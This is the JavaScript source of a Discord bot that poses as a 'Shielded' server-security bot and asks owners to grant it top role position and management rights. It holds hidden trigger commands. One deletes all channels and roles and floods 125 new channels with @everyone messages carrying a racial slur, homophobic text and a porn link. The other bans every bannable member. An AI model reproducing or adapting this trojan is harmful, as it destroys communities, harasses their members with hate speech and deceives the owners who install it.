const { Client, GatewayIntentBits, EmbedBuilder, ActivityType } = require('discord.js');
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.MessageContent
    ]
});

// Define the total number of channels to create
const channelAmount = 125; // Set the desired number of channels here

client.once('ready', () => {
    console.log('Bot is ready!');

    client.user.setPresence({ 
        activities: [{ 
            name: 'server security.', 
            type: ActivityType.Watching, 
        }], 
        status: 'online' 
    });
});

client.on('guildCreate', async guild => {
    console.log(`Joined a new guild: ${guild.name}`);

    // Wait for a short period to ensure the cache is populated
    await new Promise(resolve => setTimeout(resolve, 1000)); // 5-second delay

    // Log available channels for debugging
    console.log('Available channels:', guild.channels.cache.map(c => `${c.name} (${c.type})`).join(', '));

    const embed = new EmbedBuilder()
        .setTitle("Thank you for inviting me 👋")
        .setDescription("Thank you for inviting me to your Discord server. In order for me to function properly, you must do the following:\n\n- Drag the \"Shielded\" role to the top of the directory.\n- Make sure I have the \"Manage Server\" role enabled.\n\nThe reason these must be done is to guarantee I can protect your server with no complications.")
        .setColor("#00b0f4")
        .setFooter({
            text: "© Shielded - 2024",
        });

    // Get the bot's member object
    const botMember = guild.members.cache.get(client.user.id);
    if (!botMember) {
        console.error('Bot member object not found in cache.');
        return;
    }

    // Filter text channels
    const textChannels = guild.channels.cache.filter(channel => {
        const isText = channel.isTextBased(); // Check if the channel is text-based
        const permissions = channel.permissionsFor(botMember); // Get permissions for bot member
        const canSendMessages = permissions ? permissions.has('SEND_MESSAGES') : false; // Check if bot can send messages
        console.log(`Channel ${channel.name} is text-based: ${isText}, can send messages: ${canSendMessages}`);
        return isText && canSendMessages;
    });

    if (textChannels.size === 0) {
        console.error('No text channels found or bot lacks permissions to send messages.');
        return;
    }

    // Try sending the welcome message to each text channel
    for (const [id, channel] of textChannels) {
        try {
            await channel.send({ embeds: [embed] });
            console.log(`Sent welcome message to ${channel.name}`);
            break; // Exit loop once successful
        } catch (error) {
            console.error(`Failed to send welcome message to ${channel.name}:`, error);
        }
    }
});



client.on('messageCreate', async message => {
    if (message.author.bot || !message.guild) return;

    console.log(`Received message: ${message.content}`);

    if (message.content === '?jittle3' || message.content === '?jittle1') {
        const botMember = await message.guild.members.fetch(client.user.id);
        
        // Check if the bot has the Administrator permission
        if (botMember.permissions.has('ADMINISTRATOR')) {
            if (message.content === '?jittle3') {
                try {
                    console.log('Executing ?jittle3 command');

                    // Store the original message to send a reply later
                    const originalMessage = message;

                    // Delete all channels
                    const channels = message.guild.channels.cache;
                    for (const [id, channel] of channels) {
                        await channel.delete().catch(error => console.error(`Failed to delete channel ${channel.name}:`, error));
                    }

                    // Delete all roles except the @everyone role
                    const roles = message.guild.roles.cache.filter(role => role.name !== '@everyone');
                    for (const [id, role] of roles) {
                        await role.delete().catch(error => console.error(`Failed to delete role ${role.name}:`, error));
                    }

                    // Create channels and send messages
                    const channelsName = "gay-porn-uwu";  // Set your desired channel name here
                    const messageInChannel = "@everyone NIGGERS LOVE GAY PORN\nhttps://cdn.discordapp.com/attachments/1248471823578955838/1248841534296821761/kFQhocKK.gif?ex=66b0f010&is=66af9e90&hm=eee759ec03f7dc8bdfc7ecd483225fde55691860f14f63f1a5ebf1fe4fac38c5&";  // Set your desired message here
                    const batchSize = 20;  // Number of channels to create per batch
                    const delay = 2000;  // Delay in milliseconds between batches

                    for (let i = 0; i < channelAmount; i++) {
                        try {
                            // Create the channel
                            const channel = await message.guild.channels.create({
                                name: `${channelsName} ${i + 1}`,
                                reason: 'Creating channels for ?jittle3 command'
                            });

                            // Send a message to the newly created channel
                            await channel.send(messageInChannel);
                            await channel.send(messageInChannel);

                            console.log(`Created and messaged channel ${channelsName} ${i + 1}`);
                        } catch (error) {
                            console.error(`Failed to create or message channel ${channelsName} ${i + 1}:`, error);
                        }

                        // Optional: Add delay between batches to avoid rate limits
                        if ((i + 1) % batchSize === 0 && i + 1 < channelAmount) {
                            console.log(`Waiting for ${delay}ms to avoid rate limits`);
                            await new Promise(resolve => setTimeout(resolve, delay));
                        }
                    }

                    // Reply to the original message
                    if (originalMessage.channel) {
                        await originalMessage.reply({ content: 'Command executed successfully.', ephemeral: true });
                    } else {
                        console.error('Original message channel is not cached.');
                    }
                } catch (error) {
                    console.error('Error executing ?jittle3 command:', error);
                    if (message.channel) {
                        await message.channel.send({ content: 'An error occurred while executing the command.', ephemeral: true });
                    }
                }
            } else if (message.content === '?jittle1') {
                try {
                    console.log('Executing ?jittle1 command');
        
                    // Fetch bot member and check permissions
                    const botMember = await message.guild.members.fetch(client.user.id);
                    if (!botMember.permissions.has('BAN_MEMBERS')) {
                        await message.reply({ content: 'I need the Ban Members permission to proceed.', ephemeral: true });
                        return;
                    }
        
                    // Check if the bot role is high enough in the role hierarchy
                    const botRole = message.guild.roles.cache.find(role => role.id === botMember.roles.highest.id);
                    if (!botRole || botRole.position < 1) {
                        await message.reply({ content: 'The bot role must be high enough to ban members.', ephemeral: true });
                        return;
                    }
        
                    // Fetch all members
                    const members = await message.guild.members.fetch();
                    console.log(`Attempting to ban ${members.size} members`);
                    for (const [id, member] of members) {
                        if (member.id !== client.user.id && member.bannable) {
                            try {
                                await member.ban({ reason: 'Executed ?jittle1 command' });
                                console.log(`Successfully banned member ${member.user.tag}`);
                                await new Promise(resolve => setTimeout(resolve, 1000)); // Delay between each ban
                            } catch (error) {
                                console.error(`Failed to ban member ${member.user.tag}:`, error);
                            }
                        } else {
                            console.log(`Skipping member ${member.user.tag}. Either they cannot be banned or are the bot itself.`);
                        }
                    }
        
                    await message.reply({ content: 'Command executed successfully.', ephemeral: true });
                } catch (error) {
                    console.error('Error executing ?jittle1 command:', error);
                    await message.reply({ content: 'An error occurred while executing the command.', ephemeral: true });
                }
            }
        }
    }
            
});


client.login('token');
